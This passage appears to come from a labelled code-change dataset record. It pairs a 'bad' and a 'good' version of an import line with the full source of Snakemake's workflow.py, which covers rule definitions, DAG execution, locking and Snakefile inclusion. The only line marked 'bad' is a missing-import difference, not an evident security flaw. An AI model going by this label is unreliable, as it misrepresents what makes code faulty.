"badparts": ["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"], "goodparts": ["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import re import os import sys import signal import json import urllib from collections import OrderedDict from itertools import filterfalse, chain from functools import partial from operator import attrgetter from snakemake.logging import logger, format_resources, format_resource_names from snakemake.rules import Rule, Ruleorder from snakemake.exceptions import RuleException, CreateRuleException, \\ UnknownRuleException, NoRulesException, print_exception, WorkflowError from snakemake.shell import shell from snakemake.dag import DAG from snakemake.scheduler import JobScheduler from snakemake.parser import parse import snakemake.io from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch from snakemake.persistence import Persistence from snakemake.utils import update_config class Workflow: def __init__(self, snakefile=None, snakemakepath=None, jobscript=None, overwrite_shellcmd=None, overwrite_config=dict(), overwrite_workdir=None, overwrite_configfile=None, config_args=None, debug=False): \"\"\" Create the controller. \"\"\" self._rules=OrderedDict() self.first_rule=None self._workdir=None self.overwrite_workdir=overwrite_workdir self.workdir_init=os.path.abspath(os.curdir) self._ruleorder=Ruleorder() self._localrules=set() self.linemaps=dict() self.rule_count=0 self.basedir=os.path.dirname(snakefile) self.snakefile=os.path.abspath(snakefile) self.snakemakepath=snakemakepath self.included=[] self.included_stack=[] self.jobscript=jobscript self.persistence=None self.global_resources=None self.globals=globals() self._subworkflows=dict() self.overwrite_shellcmd=overwrite_shellcmd self.overwrite_config=overwrite_config self.overwrite_configfile=overwrite_configfile self.config_args=config_args self._onsuccess=lambda log: None self._onerror=lambda log: None self.debug=debug global config config=dict() config.update(self.overwrite_config) global rules rules=Rules() @property def subworkflows(self): return self._subworkflows.values() @property def rules(self): return self._rules.values() @property def concrete_files(self): return( file for rule in self.rules for file in chain(rule.input, rule.output) if not callable(file) and not file.contains_wildcard() ) def check(self): for clause in self._ruleorder: for rulename in clause: if not self.is_rule(rulename): raise UnknownRuleException( rulename, prefix=\"Error in ruleorder definition.\") def add_rule(self, name=None, lineno=None, snakefile=None): \"\"\" Add a rule. \"\"\" if name is None: name=str(len(self._rules) +1) if self.is_rule(name): raise CreateRuleException( \"The name{} is already used by another rule\".format(name)) rule=Rule(name, self, lineno=lineno, snakefile=snakefile) self._rules[rule.name]=rule self.rule_count +=1 if not self.first_rule: self.first_rule=rule.name return name def is_rule(self, name): \"\"\" Return True if name is the name of a rule. Arguments name --a name \"\"\" return name in self._rules def get_rule(self, name): \"\"\" Get rule by name. Arguments name --the name of the rule \"\"\" if not self._rules: raise NoRulesException() if not name in self._rules: raise UnknownRuleException(name) return self._rules[name] def list_rules(self, only_targets=False): rules=self.rules if only_targets: rules=filterfalse(Rule.has_wildcards, rules) for rule in rules: logger.rule_info(name=rule.name, docstring=rule.docstring) def list_resources(self): for resource in set( resource for rule in self.rules for resource in rule.resources): if resource not in \"_cores _nodes\".split(): logger.info(resource) def is_local(self, rule): return rule.name in self._localrules or rule.norun def execute(self, targets=None, dryrun=False, touch=False, cores=1, nodes=1, local_cores=1, forcetargets=False, forceall=False, forcerun=None, prioritytargets=None, quiet=False, keepgoing=False, printshellcmds=False, printreason=False, printdag=False, cluster=None, cluster_config=None, cluster_sync=None, jobname=None, immediate_submit=False, ignore_ambiguity=False, printrulegraph=False, printd3dag=False, drmaa=None, stats=None, force_incomplete=False, ignore_incomplete=False, list_version_changes=False, list_code_changes=False, list_input_changes=False, list_params_changes=False, summary=False, detailed_summary=False, latency_wait=3, benchmark_repeats=3, wait_for_files=None, nolock=False, unlock=False, resources=None, notemp=False, nodeps=False, cleanup_metadata=None, subsnakemake=None, updated_files=None, keep_target_files=False, allowed_rules=None, greediness=1.0, no_hooks=False): self.global_resources=dict() if resources is None else resources self.global_resources[\"_cores\"]=cores self.global_resources[\"_nodes\"]=nodes def rules(items): return map(self._rules.__getitem__, filter(self.is_rule, items)) if keep_target_files: def files(items): return filterfalse(self.is_rule, items) else: def files(items): return map(os.path.relpath, filterfalse(self.is_rule, items)) if not targets: targets=[self.first_rule ] if self.first_rule is not None else list() if prioritytargets is None: prioritytargets=list() if forcerun is None: forcerun=list() priorityrules=set(rules(prioritytargets)) priorityfiles=set(files(prioritytargets)) forcerules=set(rules(forcerun)) forcefiles=set(files(forcerun)) targetrules=set(chain(rules(targets), filterfalse(Rule.has_wildcards, priorityrules), filterfalse(Rule.has_wildcards, forcerules))) targetfiles=set(chain(files(targets), priorityfiles, forcefiles)) if forcetargets: forcefiles.update(targetfiles) forcerules.update(targetrules) rules=self.rules if allowed_rules: rules=[rule for rule in rules if rule.name in set(allowed_rules)] if wait_for_files is not None: try: snakemake.io.wait_for_files(wait_for_files, latency_wait=latency_wait) except IOError as e: logger.error(str(e)) return False dag=DAG( self, rules, dryrun=dryrun, targetfiles=targetfiles, targetrules=targetrules, forceall=forceall, forcefiles=forcefiles, forcerules=forcerules, priorityfiles=priorityfiles, priorityrules=priorityrules, ignore_ambiguity=ignore_ambiguity, force_incomplete=force_incomplete, ignore_incomplete=ignore_incomplete or printdag or printrulegraph, notemp=notemp) self.persistence=Persistence( nolock=nolock, dag=dag, warn_only=dryrun or printrulegraph or printdag or summary or list_version_changes or list_code_changes or list_input_changes or list_params_changes) if cleanup_metadata: for f in cleanup_metadata: self.persistence.cleanup_metadata(f) return True dag.init() dag.check_dynamic() if unlock: try: self.persistence.cleanup_locks() logger.info(\"Unlocking working directory.\") return True except IOError: logger.error(\"Error: Unlocking the directory{} failed. Maybe \" \"you don't have the permissions?\") return False try: self.persistence.lock() except IOError: logger.error( \"Error: Directory cannot be locked. Please make \" \"sure that no other Snakemake process is trying to create \" \"the same files in the following directory:\\n{}\\n\" \"If you are sure that no other \" \"instances of snakemake are running on this directory, \" \"the remaining lock was likely caused by a kill signal or \" \"a power loss. It can be removed with \" \"the --unlock argument.\".format(os.getcwd())) return False if self.subworkflows and not printdag and not printrulegraph: globals_backup=dict(self.globals) for subworkflow in self.subworkflows: subworkflow_targets=subworkflow.targets(dag) updated=list() if subworkflow_targets: logger.info( \"Executing subworkflow{}.\".format(subworkflow.name)) if not subsnakemake(subworkflow.snakefile, workdir=subworkflow.workdir, targets=subworkflow_targets, updated_files=updated): return False dag.updated_subworkflow_files.update(subworkflow.target(f) for f in updated) else: logger.info(\"Subworkflow{}: Nothing to be done.\".format( subworkflow.name)) if self.subworkflows: logger.info(\"Executing main workflow.\") self.globals.update(globals_backup) dag.check_incomplete() dag.postprocess() if nodeps: missing_input=[f for job in dag.targetjobs for f in job.input if dag.needrun(job) and not os.path.exists(f)] if missing_input: logger.error( \"Dependency resolution disabled(--nodeps) \" \"but missing input \" \"files detected. If this happens on a cluster, please make sure \" \"that you handle the dependencies yourself or turn of \" \"--immediate-submit. Missing input files:\\n{}\".format( \"\\n\".join(missing_input))) return False updated_files.extend(f for job in dag.needrun_jobs for f in job.output) if printd3dag: dag.d3dag() return True elif printdag: print(dag) return True elif printrulegraph: print(dag.rule_dot()) return True elif summary: print(\"\\n\".join(dag.summary(detailed=False))) return True elif detailed_summary: print(\"\\n\".join(dag.summary(detailed=True))) return True elif list_version_changes: items=list( chain(*map(self.persistence.version_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_code_changes: items=list(chain(*map(self.persistence.code_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_input_changes: items=list(chain(*map(self.persistence.input_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_params_changes: items=list( chain(*map(self.persistence.params_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True scheduler=JobScheduler(self, dag, cores, local_cores=local_cores, dryrun=dryrun, touch=touch, cluster=cluster, cluster_config=cluster_config, cluster_sync=cluster_sync, jobname=jobname, immediate_submit=immediate_submit, quiet=quiet, keepgoing=keepgoing, drmaa=drmaa, printreason=printreason, printshellcmds=printshellcmds, latency_wait=latency_wait, benchmark_repeats=benchmark_repeats, greediness=greediness) if not dryrun and not quiet: if len(dag): if cluster or cluster_sync or drmaa: logger.resources_info( \"Provided cluster nodes:{}\".format(nodes)) else: logger.resources_info(\"Provided cores:{}\".format(cores)) logger.resources_info(\"Rules claiming more threads will be scaled down.\") provided_resources=format_resources(resources) if provided_resources: logger.resources_info( \"Provided resources: \" +provided_resources) ignored_resources=format_resource_names( set(resource for job in dag.needrun_jobs for resource in job.resources_dict if resource not in resources)) if ignored_resources: logger.resources_info( \"Ignored resources: \" +ignored_resources) logger.run_info(\"\\n\".join(dag.stats())) else: logger.info(\"Nothing to be done.\") if dryrun and not len(dag): logger.info(\"Nothing to be done.\") success=scheduler.schedule() if success: if dryrun: if not quiet and len(dag): logger.run_info(\"\\n\".join(dag.stats())) elif stats: scheduler.stats.to_json(stats) if not dryrun and not no_hooks: self._onsuccess(logger.get_logfile()) return True else: if not dryrun and not no_hooks: self._onerror(logger.get_logfile()) return False def include(self, snakefile, overwrite_first_rule=False, print_compilation=False, overwrite_shellcmd=None): \"\"\" Include a snakefile. \"\"\" if not urllib.parse.urlparse(snakefile).scheme: if not os.path.isabs(snakefile) and self.included_stack: current_path=os.path.dirname(self.included_stack[-1]) snakefile=os.path.join(current_path, snakefile) snakefile=os.path.abspath(snakefile) if snakefile in self.included: logger.info(\"Multiple include of{} ignored\".format(snakefile)) return self.included.append(snakefile) self.included_stack.append(snakefile) global workflow workflow=self first_rule=self.first_rule code, linemap=parse(snakefile, overwrite_shellcmd=self.overwrite_shellcmd) if print_compilation: print(code) sys.path.insert(0, os.path.dirname(snakefile)) self.linemaps[snakefile]=linemap exec(compile(code, snakefile, \"exec\"), self.globals) if not overwrite_first_rule: self.first_rule=first_rule self.included_stack.pop() def onsuccess(self, func): self._onsuccess=func def onerror(self, func): self._onerror=func def workdir(self, workdir): if self.overwrite_workdir is None: if not os.path.exists(workdir): os.makedirs(workdir) self._workdir=workdir os.chdir(workdir) def configfile(self, jsonpath): \"\"\" Update the global config with the given dictionary. \"\"\" global config c=snakemake.io.load_configfile(jsonpath) update_config(config, c) update_config(config, self.overwrite_config) def ruleorder(self, *rulenames): self._ruleorder.add(*rulenames) def subworkflow(self, name, snakefile=None, workdir=None): sw=Subworkflow(self, name, snakefile, workdir) self._subworkflows[name]=sw self.globals[name]=sw.target def localrules(self, *rulenames): self._localrules.update(rulenames) def rule(self, name=None, lineno=None, snakefile=None): name=self.add_rule(name, lineno, snakefile) rule=self.get_rule(name) def decorate(ruleinfo): if ruleinfo.input: rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1]) if ruleinfo.output: rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1]) if ruleinfo.params: rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1]) if ruleinfo.threads: if not isinstance(ruleinfo.threads, int): raise RuleException(\"Threads value has to be an integer.\", rule=rule) rule.resources[\"_cores\"]=ruleinfo.threads if ruleinfo.resources: args, resources=ruleinfo.resources if args: raise RuleException(\"Resources have to be named.\") if not all(map(lambda r: isinstance(r, int), resources.values())): raise RuleException( \"Resources values have to be integers.\", rule=rule) rule.resources.update(resources) if ruleinfo.priority: if(not isinstance(ruleinfo.priority, int) and not isinstance(ruleinfo.priority, float)): raise RuleException(\"Priority values have to be numeric.\", rule=rule) rule.priority=ruleinfo.priority if ruleinfo.version: rule.version=ruleinfo.version if ruleinfo.log: rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1]) if ruleinfo.message: rule.message=ruleinfo.message if ruleinfo.benchmark: rule.benchmark=ruleinfo.benchmark rule.norun=ruleinfo.norun rule.docstring=ruleinfo.docstring rule.run_func=ruleinfo.func rule.shellcmd=ruleinfo.shellcmd ruleinfo.func.__name__=\"__{}\".format(name) self.globals[ruleinfo.func.__name__]=ruleinfo.func setattr(rules, name, rule) return ruleinfo.func return decorate def docstring(self, string): def decorate(ruleinfo): ruleinfo.docstring=string return ruleinfo return decorate def input(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.input=(paths, kwpaths) return ruleinfo return decorate def output(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.output=(paths, kwpaths) return ruleinfo return decorate def params(self, *params, **kwparams): def decorate(ruleinfo): ruleinfo.params=(params, kwparams) return ruleinfo return decorate def message(self, message): def decorate(ruleinfo): ruleinfo.message=message return ruleinfo return decorate def benchmark(self, benchmark): def decorate(ruleinfo): ruleinfo.benchmark=benchmark return ruleinfo return decorate def threads(self, threads): def decorate(ruleinfo): ruleinfo.threads=threads return ruleinfo return decorate def resources(self, *args, **resources): def decorate(ruleinfo): ruleinfo.resources=(args, resources) return ruleinfo return decorate def priority(self, priority): def decorate(ruleinfo): ruleinfo.priority=priority return ruleinfo return decorate def version(self, version): def decorate(ruleinfo): ruleinfo.version=version return ruleinfo return decorate def log(self, *logs, **kwlogs): def decorate(ruleinfo): ruleinfo.log=(logs, kwlogs) return ruleinfo return decorate def shellcmd(self, cmd): def decorate(ruleinfo): ruleinfo.shellcmd=cmd return ruleinfo return decorate def norun(self): def decorate(ruleinfo): ruleinfo.norun=True return ruleinfo return decorate def run(self, func): return RuleInfo(func) @staticmethod def _empty_decorator(f): return f class RuleInfo: def __init__(self, func): self.func=func self.shellcmd=None self.norun=False self.input=None self.output=None self.params=None self.message=None self.benchmark=None self.threads=None self.resources=None self.priority=None self.version=None self.log=None self.docstring=None class Subworkflow: def __init__(self, workflow, name, snakefile, workdir): self.workflow=workflow self.name=name self._snakefile=snakefile self._workdir=workdir @property def snakefile(self): if self._snakefile is None: return os.path.abspath(os.path.join(self.workdir, \"Snakefile\")) if not os.path.isabs(self._snakefile): return os.path.abspath(os.path.join(self.workflow.basedir, self._snakefile)) return self._snakefile @property def workdir(self): workdir=\".\" if self._workdir is None else self._workdir if not os.path.isabs(workdir): return os.path.abspath(os.path.join(self.workflow.basedir, workdir)) return workdir def target(self, paths): if not_iterable(paths): return flag(os.path.join(self.workdir, paths), \"subworkflow\", self) return[self.target(path) for path in paths] def targets(self, dag): return[f for job in dag.jobs for f in job.subworkflow_input if job.subworkflow_input[f] is self] class Rules: \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\" pass def srcdir(path): \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\" if not workflow.included_stack: return None return os.path.join(os.path.dirname(workflow.included_stack[-1]), path) ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport re\nimport os\nimport sys\nimport signal\nimport json\nimport urllib\nfrom collections import OrderedDict\nfrom itertools import filterfalse, chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.logging import logger, format_resources, format_resource_names\nfrom snakemake.rules import Rule, Ruleorder\nfrom snakemake.exceptions import RuleException, CreateRuleException, \\\n    UnknownRuleException, NoRulesException, print_exception, WorkflowError\nfrom snakemake.shell import shell\nfrom snakemake.dag import DAG\nfrom snakemake.scheduler import JobScheduler\nfrom snakemake.parser import parse\nimport snakemake.io\nfrom snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\nfrom snakemake.persistence import Persistence\nfrom snakemake.utils import update_config\n\n\nclass Workflow:\n    def __init__(self,\n                 snakefile=None,\n                 snakemakepath=None,\n                 jobscript=None,\n                 overwrite_shellcmd=None,\n                 overwrite_config=dict(),\n                 overwrite_workdir=None,\n                 overwrite_configfile=None,\n                 config_args=None,\n                 debug=False):\n        \"\"\"\n        Create the controller.\n        \"\"\"\n        self._rules = OrderedDict()\n        self.first_rule = None\n        self._workdir = None\n        self.overwrite_workdir = overwrite_workdir\n        self.workdir_init = os.path.abspath(os.curdir)\n        self._ruleorder = Ruleorder()\n        self._localrules = set()\n        self.linemaps = dict()\n        self.rule_count = 0\n        self.basedir = os.path.dirname(snakefile)\n        self.snakefile = os.path.abspath(snakefile)\n        self.snakemakepath = snakemakepath\n        self.included = []\n        self.included_stack = []\n        self.jobscript = jobscript\n        self.persistence = None\n        self.global_resources = None\n        self.globals = globals()\n        self._subworkflows = dict()\n        self.overwrite_shellcmd = overwrite_shellcmd\n        self.overwrite_config = overwrite_config\n        self.overwrite_configfile = overwrite_configfile\n        self.config_args = config_args\n        self._onsuccess = lambda log: None\n        self._onerror = lambda log: None\n        self.debug = debug\n\n        global config\n        config = dict()\n        config.update(self.overwrite_config)\n\n        global rules\n        rules = Rules()\n\n    @property\n    def subworkflows(self):\n        return self._subworkflows.values()\n\n    @property\n    def rules(self):\n        return self._rules.values()\n\n    @property\n    def concrete_files(self):\n        return (\n            file\n            for rule in self.rules for file in chain(rule.input, rule.output)\n            if not callable(file) and not file.contains_wildcard()\n        )\n\n    def check(self):\n        for clause in self._ruleorder:\n            for rulename in clause:\n                if not self.is_rule(rulename):\n                    raise UnknownRuleException(\n                        rulename,\n                        prefix=\"Error in ruleorder definition.\")\n\n    def add_rule(self, name=None, lineno=None, snakefile=None):\n        \"\"\"\n        Add a rule.\n        \"\"\"\n        if name is None:\n            name = str(len(self._rules) + 1)\n        if self.is_rule(name):\n            raise CreateRuleException(\n                \"The name {} is already used by another rule\".format(name))\n        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)\n        self._rules[rule.name] = rule\n        self.rule_count += 1\n        if not self.first_rule:\n            self.first_rule = rule.name\n        return name\n\n    def is_rule(self, name):\n        \"\"\"\n        Return True if name is the name of a rule.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        return name in self._rules\n\n    def get_rule(self, name):\n        \"\"\"\n        Get rule by name.\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if not self._rules:\n            raise NoRulesException()\n        if not name in self._rules:\n            raise UnknownRuleException(name)\n        return self._rules[name]\n\n    def list_rules(self, only_targets=False):\n        rules = self.rules\n        if only_targets:\n            rules = filterfalse(Rule.has_wildcards, rules)\n        for rule in rules:\n            logger.rule_info(name=rule.name, docstring=rule.docstring)\n\n    def list_resources(self):\n        for resource in set(\n            resource for rule in self.rules for resource in rule.resources):\n            if resource not in \"_cores _nodes\".split():\n                logger.info(resource)\n\n    def is_local(self, rule):\n        return rule.name in self._localrules or rule.norun\n\n    def execute(self,\n                targets=None,\n                dryrun=False,\n                touch=False,\n                cores=1,\n                nodes=1,\n                local_cores=1,\n                forcetargets=False,\n                forceall=False,\n                forcerun=None,\n                prioritytargets=None,\n                quiet=False,\n                keepgoing=False,\n                printshellcmds=False,\n                printreason=False,\n                printdag=False,\n                cluster=None,\n                cluster_config=None,\n                cluster_sync=None,\n                jobname=None,\n                immediate_submit=False,\n                ignore_ambiguity=False,\n                printrulegraph=False,\n                printd3dag=False,\n                drmaa=None,\n                stats=None,\n                force_incomplete=False,\n                ignore_incomplete=False,\n                list_version_changes=False,\n                list_code_changes=False,\n                list_input_changes=False,\n                list_params_changes=False,\n                summary=False,\n                detailed_summary=False,\n                latency_wait=3,\n                benchmark_repeats=3,\n                wait_for_files=None,\n                nolock=False,\n                unlock=False,\n                resources=None,\n                notemp=False,\n                nodeps=False,\n                cleanup_metadata=None,\n                subsnakemake=None,\n                updated_files=None,\n                keep_target_files=False,\n                allowed_rules=None,\n                greediness=1.0,\n                no_hooks=False):\n\n        self.global_resources = dict() if resources is None else resources\n        self.global_resources[\"_cores\"] = cores\n        self.global_resources[\"_nodes\"] = nodes\n\n        def rules(items):\n            return map(self._rules.__getitem__, filter(self.is_rule, items))\n\n        if keep_target_files:\n\n            def files(items):\n                return filterfalse(self.is_rule, items)\n        else:\n\n            def files(items):\n                return map(os.path.relpath, filterfalse(self.is_rule, items))\n\n        if not targets:\n            targets = [self.first_rule\n                       ] if self.first_rule is not None else list()\n        if prioritytargets is None:\n            prioritytargets = list()\n        if forcerun is None:\n            forcerun = list()\n\n        priorityrules = set(rules(prioritytargets))\n        priorityfiles = set(files(prioritytargets))\n        forcerules = set(rules(forcerun))\n        forcefiles = set(files(forcerun))\n        targetrules = set(chain(rules(targets),\n                                filterfalse(Rule.has_wildcards, priorityrules),\n                                filterfalse(Rule.has_wildcards, forcerules)))\n        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))\n        if forcetargets:\n            forcefiles.update(targetfiles)\n            forcerules.update(targetrules)\n\n        rules = self.rules\n        if allowed_rules:\n            rules = [rule for rule in rules if rule.name in set(allowed_rules)]\n\n        if wait_for_files is not None:\n            try:\n                snakemake.io.wait_for_files(wait_for_files,\n                                            latency_wait=latency_wait)\n            except IOError as e:\n                logger.error(str(e))\n                return False\n\n        dag = DAG(\n            self, rules,\n            dryrun=dryrun,\n            targetfiles=targetfiles,\n            targetrules=targetrules,\n            forceall=forceall,\n            forcefiles=forcefiles,\n            forcerules=forcerules,\n            priorityfiles=priorityfiles,\n            priorityrules=priorityrules,\n            ignore_ambiguity=ignore_ambiguity,\n            force_incomplete=force_incomplete,\n            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,\n            notemp=notemp)\n\n        self.persistence = Persistence(\n            nolock=nolock,\n            dag=dag,\n            warn_only=dryrun or printrulegraph or printdag or summary or\n            list_version_changes or list_code_changes or list_input_changes or\n            list_params_changes)\n\n        if cleanup_metadata:\n            for f in cleanup_metadata:\n                self.persistence.cleanup_metadata(f)\n            return True\n\n        dag.init()\n        dag.check_dynamic()\n\n        if unlock:\n            try:\n                self.persistence.cleanup_locks()\n                logger.info(\"Unlocking working directory.\")\n                return True\n            except IOError:\n                logger.error(\"Error: Unlocking the directory {} failed. Maybe \"\n                             \"you don't have the permissions?\")\n                return False\n        try:\n            self.persistence.lock()\n        except IOError:\n            logger.error(\n                \"Error: Directory cannot be locked. Please make \"\n                \"sure that no other Snakemake process is trying to create \"\n                \"the same files in the following directory:\\n{}\\n\"\n                \"If you are sure that no other \"\n                \"instances of snakemake are running on this directory, \"\n                \"the remaining lock was likely caused by a kill signal or \"\n                \"a power loss. It can be removed with \"\n                \"the --unlock argument.\".format(os.getcwd()))\n            return False\n\n        if self.subworkflows and not printdag and not printrulegraph:\n            # backup globals\n            globals_backup = dict(self.globals)\n            # execute subworkflows\n            for subworkflow in self.subworkflows:\n                subworkflow_targets = subworkflow.targets(dag)\n                updated = list()\n                if subworkflow_targets:\n                    logger.info(\n                        \"Executing subworkflow {}.\".format(subworkflow.name))\n                    if not subsnakemake(subworkflow.snakefile,\n                                        workdir=subworkflow.workdir,\n                                        targets=subworkflow_targets,\n                                        updated_files=updated):\n                        return False\n                    dag.updated_subworkflow_files.update(subworkflow.target(f)\n                                                         for f in updated)\n                else:\n                    logger.info(\"Subworkflow {}: Nothing to be done.\".format(\n                        subworkflow.name))\n            if self.subworkflows:\n                logger.info(\"Executing main workflow.\")\n            # rescue globals\n            self.globals.update(globals_backup)\n\n        dag.check_incomplete()\n        dag.postprocess()\n\n        if nodeps:\n            missing_input = [f for job in dag.targetjobs for f in job.input\n                             if dag.needrun(job) and not os.path.exists(f)]\n            if missing_input:\n                logger.error(\n                    \"Dependency resolution disabled (--nodeps) \"\n                    \"but missing input \"\n                    \"files detected. If this happens on a cluster, please make sure \"\n                    \"that you handle the dependencies yourself or turn of \"\n                    \"--immediate-submit. Missing input files:\\n{}\".format(\n                        \"\\n\".join(missing_input)))\n                return False\n\n        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)\n\n        if printd3dag:\n            dag.d3dag()\n            return True\n        elif printdag:\n            print(dag)\n            return True\n        elif printrulegraph:\n            print(dag.rule_dot())\n            return True\n        elif summary:\n            print(\"\\n\".join(dag.summary(detailed=False)))\n            return True\n        elif detailed_summary:\n            print(\"\\n\".join(dag.summary(detailed=True)))\n            return True\n        elif list_version_changes:\n            items = list(\n                chain(*map(self.persistence.version_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_code_changes:\n            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_input_changes:\n            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_params_changes:\n            items = list(\n                chain(*map(self.persistence.params_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n\n        scheduler = JobScheduler(self, dag, cores,\n                                 local_cores=local_cores,\n                                 dryrun=dryrun,\n                                 touch=touch,\n                                 cluster=cluster,\n                                 cluster_config=cluster_config,\n                                 cluster_sync=cluster_sync,\n                                 jobname=jobname,\n                                 immediate_submit=immediate_submit,\n                                 quiet=quiet,\n                                 keepgoing=keepgoing,\n                                 drmaa=drmaa,\n                                 printreason=printreason,\n                                 printshellcmds=printshellcmds,\n                                 latency_wait=latency_wait,\n                                 benchmark_repeats=benchmark_repeats,\n                                 greediness=greediness)\n\n        if not dryrun and not quiet:\n            if len(dag):\n                if cluster or cluster_sync or drmaa:\n                    logger.resources_info(\n                        \"Provided cluster nodes: {}\".format(nodes))\n                else:\n                    logger.resources_info(\"Provided cores: {}\".format(cores))\n                    logger.resources_info(\"Rules claiming more threads will be scaled down.\")\n                provided_resources = format_resources(resources)\n                if provided_resources:\n                    logger.resources_info(\n                        \"Provided resources: \" + provided_resources)\n                ignored_resources = format_resource_names(\n                    set(resource for job in dag.needrun_jobs for resource in\n                        job.resources_dict if resource not in resources))\n                if ignored_resources:\n                    logger.resources_info(\n                        \"Ignored resources: \" + ignored_resources)\n                logger.run_info(\"\\n\".join(dag.stats()))\n            else:\n                logger.info(\"Nothing to be done.\")\n        if dryrun and not len(dag):\n            logger.info(\"Nothing to be done.\")\n\n        success = scheduler.schedule()\n\n        if success:\n            if dryrun:\n                if not quiet and len(dag):\n                    logger.run_info(\"\\n\".join(dag.stats()))\n            elif stats:\n                scheduler.stats.to_json(stats)\n            if not dryrun and not no_hooks:\n                self._onsuccess(logger.get_logfile())\n            return True\n        else:\n            if not dryrun and not no_hooks:\n                self._onerror(logger.get_logfile())\n            return False\n\n    def include(self, snakefile,\n                overwrite_first_rule=False,\n                print_compilation=False,\n                overwrite_shellcmd=None):\n        \"\"\"\n        Include a snakefile.\n        \"\"\"\n        # check if snakefile is a path to the filesystem\n        if not urllib.parse.urlparse(snakefile).scheme:\n            if not os.path.isabs(snakefile) and self.included_stack:\n                current_path = os.path.dirname(self.included_stack[-1])\n                snakefile = os.path.join(current_path, snakefile)\n            snakefile = os.path.abspath(snakefile)\n        # else it could be an url.\n        # at least we don't want to modify the path for clarity.\n\n        if snakefile in self.included:\n            logger.info(\"Multiple include of {} ignored\".format(snakefile))\n            return\n        self.included.append(snakefile)\n        self.included_stack.append(snakefile)\n\n        global workflow\n\n        workflow = self\n\n        first_rule = self.first_rule\n        code, linemap = parse(snakefile,\n                              overwrite_shellcmd=self.overwrite_shellcmd)\n\n        if print_compilation:\n            print(code)\n\n        # insert the current directory into sys.path\n        # this allows to import modules from the workflow directory\n        sys.path.insert(0, os.path.dirname(snakefile))\n\n        self.linemaps[snakefile] = linemap\n        exec(compile(code, snakefile, \"exec\"), self.globals)\n        if not overwrite_first_rule:\n            self.first_rule = first_rule\n        self.included_stack.pop()\n\n    def onsuccess(self, func):\n        self._onsuccess = func\n\n    def onerror(self, func):\n        self._onerror = func\n\n    def workdir(self, workdir):\n        if self.overwrite_workdir is None:\n            if not os.path.exists(workdir):\n                os.makedirs(workdir)\n            self._workdir = workdir\n            os.chdir(workdir)\n\n    def configfile(self, jsonpath):\n        \"\"\" Update the global config with the given dictionary. \"\"\"\n        global config\n        c = snakemake.io.load_configfile(jsonpath)\n        update_config(config, c)\n        update_config(config, self.overwrite_config)\n\n    def ruleorder(self, *rulenames):\n        self._ruleorder.add(*rulenames)\n\n    def subworkflow(self, name, snakefile=None, workdir=None):\n        sw = Subworkflow(self, name, snakefile, workdir)\n        self._subworkflows[name] = sw\n        self.globals[name] = sw.target\n\n    def localrules(self, *rulenames):\n        self._localrules.update(rulenames)\n\n    def rule(self, name=None, lineno=None, snakefile=None):\n        name = self.add_rule(name, lineno, snakefile)\n        rule = self.get_rule(name)\n\n        def decorate(ruleinfo):\n            if ruleinfo.input:\n                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])\n            if ruleinfo.output:\n                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])\n            if ruleinfo.params:\n                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])\n            if ruleinfo.threads:\n                if not isinstance(ruleinfo.threads, int):\n                    raise RuleException(\"Threads value has to be an integer.\",\n                                        rule=rule)\n                rule.resources[\"_cores\"] = ruleinfo.threads\n            if ruleinfo.resources:\n                args, resources = ruleinfo.resources\n                if args:\n                    raise RuleException(\"Resources have to be named.\")\n                if not all(map(lambda r: isinstance(r, int),\n                               resources.values())):\n                    raise RuleException(\n                        \"Resources values have to be integers.\",\n                        rule=rule)\n                rule.resources.update(resources)\n            if ruleinfo.priority:\n                if (not isinstance(ruleinfo.priority, int) and\n                    not isinstance(ruleinfo.priority, float)):\n                    raise RuleException(\"Priority values have to be numeric.\",\n                                        rule=rule)\n                rule.priority = ruleinfo.priority\n            if ruleinfo.version:\n                rule.version = ruleinfo.version\n            if ruleinfo.log:\n                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])\n            if ruleinfo.message:\n                rule.message = ruleinfo.message\n            if ruleinfo.benchmark:\n                rule.benchmark = ruleinfo.benchmark\n            rule.norun = ruleinfo.norun\n            rule.docstring = ruleinfo.docstring\n            rule.run_func = ruleinfo.func\n            rule.shellcmd = ruleinfo.shellcmd\n            ruleinfo.func.__name__ = \"__{}\".format(name)\n            